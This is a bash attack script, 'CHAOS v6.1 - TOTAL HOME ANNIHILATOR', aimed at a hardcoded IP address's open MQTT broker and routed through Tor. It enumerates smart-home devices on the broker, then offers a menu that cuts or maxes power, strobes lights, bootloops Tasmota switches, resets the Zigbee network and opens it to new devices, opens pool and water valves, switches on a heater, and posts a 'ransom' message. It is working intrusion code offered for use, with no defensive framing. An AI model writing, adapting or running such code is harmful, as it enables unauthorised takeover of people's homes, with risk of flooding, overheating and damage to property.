#!/bin/bash
# CHAOS v6.1 - TOTAL HOME ANNIHILATOR - FIXED DISCOVERY # WILDCARD
set -euo pipefail

# TARGET SYSTEM
HOST="82.22.173.161"
PORT="1883"
TOR="torsocks"

MAX_TEMP="50"
MAX_HUMID="99"
MAX_BRIGHT="255"
CHAOS_STATUS="TOTAL-ANNIHILATION"
RANSOM_MSG="TOTAL HOME TAKEOVER"

ENCRYPT_PAYLOAD() {
    echo -n "$1" | openssl enc -aes-256-cbc -a -nosalt -k "TRUSTEDF57-I-FUCKED-MARTHA-ROOT" 2>/dev/null | sed 's/=//g'
}

TOR_PUB() {
    local topic=$1 payload=$2 qos=2
    if [[ $# -eq 3 ]]; then
        qos=$3
    fi
    ${TOR} mosquitto_pub -h "${HOST}" -p "${PORT}" -r -q "$qos" -t "$topic" -m "$payload" >/dev/null 2>&1
}

discover_all() {
    echo "[🔍] FULL DISCOVERY ${HOST}:${PORT} (45s)..."
    
    # CAPTURE # WILDCARD FLOOD PROPERLY
    rm -f "chaos_all.txt"
    
    # Use -v for topic+payload + pipe properly
    ${TOR} mosquitto_sub -h "${HOST}" -p "${PORT}" -t "#" -v | \
    timeout 45 head -n 5000 | \
    awk '
    {
        # Extract topic (before :) and device name
        topic = $1
        if (topic ~ /Tasmota|wled|zigbee2mqtt|temp|humid|Garage|Garden|Shed|Pool|Fridge/i) {
            # Extract device name from topic
            gsub(/^.*\//, "", topic)
            gsub(/\/.*$/, "", topic)
            if (topic != "" && length(topic) > 1 && length(topic) < 50) {
                print topic
            }
        }
    }' | \
    sort -u > "chaos_all.txt"
    
    # FORCE COUNT EVEN IF EMPTY
    if [[ -f "chaos_all.txt" ]]; then
        COUNT=$(grep -c . "chaos_all.txt" 2>/dev/null || echo "0")
        if [[ $COUNT -eq 0 ]]; then
            echo "📋 TOTAL DEVICES: 0 (no matching devices found)"
        else
            echo "📋 TOTAL DEVICES: ${COUNT}"
            echo "[DEBUG] First 5 devices:"
            head -5 "chaos_all.txt"
        fi
    else
        COUNT="0"
        touch "chaos_all.txt"
        echo "📋 TOTAL DEVICES: 0"
    fi
    
    load_all
    echo "[✅] Discovery complete - ${#ALL_DEVICES[@]} devices ready"
}

load_all() {
    ALL_DEVICES=()
    if [[ -f "chaos_all.txt" && -s "chaos_all.txt" ]]; then
        mapfile -t ALL_DEVICES < "chaos_all.txt"
    fi
}

show_menu() {
    clear
    COUNT=${#ALL_DEVICES[@]}
    cat << EOF
┌─ TRUSTEDF57 - ${HOST}:${PORT} (${COUNT} TOTAL DEVICES) ─┐
│ 1)  FULL SYSTEM DISCOVERY (45s)                     │
│ 2)   TEMP 50°C + 💧 HUMIDITY 99% (ALL SENSORS)      │
│ 3)  STROBE LIGHTS + MAX BRIGHT (Tasmota/WLED)       │
│ 4)  ALL POWER OFF                                   │
│ 5)  ALL POWER ON + MAX 255                          │
│ 6)  RAINBOW + MATRIX DISCO (WLED)                   │
│ 7) BOOTLOOP Tasmota + Zigbee Flood                 │
│ 8)  BROKER + Z2M RANSOM OVERWRITE                   │
│ 9)  VALVES + POOL + FRIDGE CHAOS                    │
│ 0)  TOTAL HOME ANNIHILATION v6.1                    │
│ D)  SHOW DEVICES LIST                               │
│ X)  EXIT                                            │
└───────────────────────────────────────────────────────┘
EOF
}

check_loaded() {
    [[ ${#ALL_DEVICES[@]} -eq 0 ]] && { 
        echo "❌ No devices! Run 1) DISCOVERY first"
        sleep 2
        return 1
    }
    return 0
}

show_devices() {
    if [[ ${#ALL_DEVICES[@]} -eq 0 ]]; then
        echo "❌ No devices loaded"
        return 1
    fi
    echo "📋 ALL DEVICES (${#ALL_DEVICES[@]}):"
    printf '%s\n' "${ALL_DEVICES[@]}" | head -20
    echo "... (showing first 20)"
}

max_temp_humidity() {
    check_loaded || return 1
    echo "[🌡️💧] MAX TEMP 50°C + HUMIDITY 99% on ${#ALL_DEVICES[@]} devices..."
    
    TOR_PUB "zigbee2mqtt/bridge/request/devices"
    TOR_PUB "zigbee2mqtt/#" '{"temperature": 50, "humidity": 99}'
    
    for dev in "${ALL_DEVICES[@]}"; do
        TOR_PUB "zigbee2mqtt/${dev}/set" '{"temperature": 50, "humidity": 99}'
        TOR_PUB "zigbee2mqtt/${dev}" '{"temperature": 50, "humidity": 99, "status": "CHAOS"}'
    done
    
    TOR_PUB "climate/#" '{"temperature": 50, "humidity": 99}'
    TOR_PUB "sensor/Fridge/state" "50.0°C 99%"
    echo "✅ Sensors MAXED"
}

lights_strobe_max() {
    check_loaded || return 1
    echo "[💡] LIGHTS STROBE + MAX 255..."
    count=0
    for dev in "${ALL_DEVICES[@]}"; do
        if [[ $dev == Tasmota* || $dev == wled* || $dev == *light* ]]; then
            TOR_PUB "${dev}/cmnd/Power" "1"
            TOR_PUB "${dev}/cmnd/Bri" "255"
            TOR_PUB "${dev}/POWER" "TOGGLE"
            ((count++))
        fi
    done
    echo "✅ ${count} Lights MAXED"
}

power_off_all() {
    check_loaded || return 1
    echo "[🔴] TOTAL POWER OFF..."
    for dev in "${ALL_DEVICES[@]}"; do
        TOR_PUB "${dev}/cmnd/Power" "0"
        TOR_PUB "${dev}/POWER" "OFF"
        TOR_PUB "${dev}/set" '{"state": "OFF"}'
    done
    echo "✅ OFF"
}

power_max_all() {
    check_loaded || return 1
    echo "[🟢] TOTAL POWER ON + 255..."
    for dev in "${ALL_DEVICES[@]}"; do
        TOR_PUB "${dev}/cmnd/Power" "1"
        TOR_PUB "${dev}/POWER" "ON"
        TOR_PUB "${dev}/cmnd/Bri" "255"
        TOR_PUB "${dev}/set" '{"state": "ON", "brightness": 255}'
    done
    echo "✅ MAX POWER"
}

disco_chaos() {
    check_loaded || return 1
    echo "[🎪] RAINBOW MATRIX DISCO..."
    disco_fx="fx 38;sx 255;ix 255;bri 255;col 255,0,255"
    count=0
    for dev in "${ALL_DEVICES[@]}"; do
        if [[ $dev == wled* ]]; then
            TOR_PUB "wled/${dev}/backlog" "${disco_fx}"
            ((count++))
        fi
    done
    echo "✅ ${count} Disco devices ON"
}

bootloop_flood() {
    check_loaded || return 1
    echo "[💥] BOOTLOOP + ZIGBEE FLOOD..."
    
    bootloop="Power1;Delay 400;Power0;Delay 200;Power1;Delay 800;LOOP"
    count=0
    for dev in "${ALL_DEVICES[@]}"; do
        if [[ $dev == Tasmota* ]]; then
            TOR_PUB "Tasmota/${dev}/cmnd/Backlog" "${bootloop}"
            ((count++))
        fi
    done
    
    TOR_PUB "zigbee2mqtt/bridge/request/network/reset" '{"force": true}'
    TOR_PUB "zigbee2mqtt/bridge/request/lan/action" '{"action": "permit_join", "duration": 65535}'
    echo "✅ ${count} Bootloop + Zigbee Flood"
}

broker_ransom() {
    echo "[🔒] TOTAL RANSOM..."
    ransom_data="{\"status\":\"${CHAOS_STATUS}\",\"temp\":${MAX_TEMP},\"humid\":${MAX_HUMID},\"brightness\":${MAX_BRIGHT}}"
    crypt_data=$(ENCRYPT_PAYLOAD "${ransom_data}")
    
    TOR_PUB "\$SYS/brokers/${HOST}/sysdescr" "${RANSOM_MSG}"
    TOR_PUB "\$SYS/brokers/${HOST}/version" "${crypt_data}"
    TOR_PUB "zigbee2mqtt/bridge/state" "${crypt_data}"
    TOR_PUB "homeassistant/status" "CHAOS-TOTAL"
    echo "✅ Ransomed"
}

valves_pool_chaos() {
    check_loaded || return 1
    echo "[🏠] POOL/VALVES/FRIDGE CHAOS..."
    
    TOR_PUB "zigbee2mqtt/Pool Valve/set" '{"state": "ON"}'
    TOR_PUB "zigbee2mqtt/Water Valve/set" '{"state": "ON"}'
    TOR_PUB "zigbee2mqtt/Fridge/set" '{"temperature": 50}'
    TOR_PUB "Pool - 0xa4c13801669cffff/set" '{"state": "ON"}'
    
    TOR_PUB "Tasmota/Garage_Lights_1/cmnd/Power" "1"
    TOR_PUB "Tasmota/shed-heater/cmnd/Power" "1"
    echo "✅ Valves/Pool MAX"
}

total_annihilation_v61() {
    check_loaded || return 1
    echo "🎯 TOTAL HOME ANNIHILATION v6.1 STARTING..."
    
    power_off_all; sleep 1
    max_temp_humidity; sleep 2
    power_max_all; sleep 2
    lights_strobe_max; sleep 2
    disco_chaos; sleep 2
    bootloop_flood; sleep 2
    broker_ransom; sleep 2
    valves_pool_chaos
    
    echo "💀🏠 TOTAL ANNIHILATION COMPLETE! 💀"
}

# MAIN LOOP
ALL_DEVICES=()
clear
echo "💀 CHAOS v6.1 - ${HOST}:${PORT} - TOTAL HOME DESTRUCTION"

while true; do
    show_menu
    read -r -t 30 CHOICE || CHOICE=""
    case "${CHOICE}" in
        1) discover_all ;;
        2) max_temp_humidity ;;
        3) lights_strobe_max ;;
        4) power_off_all ;;
        5) power_max_all ;;
        6) disco_chaos ;;
        7) bootloop_flood ;;
        8) broker_ransom ;;
        9) valves_pool_chaos ;;
        0) total_annihilation_v61 ;;
        [Dd]) show_devices ;;
        [Xx]|[Qq]) echo "EXIT CHAOS"; exit 0 ;;
        *) echo "❌ ${CHOICE} invalido - try 1=DISCOVERY, D=SHOW DEVICES" ;;
    esac
    echo
    read -p "⏸️  ENTER per continuare... (X=exit)" || true
done
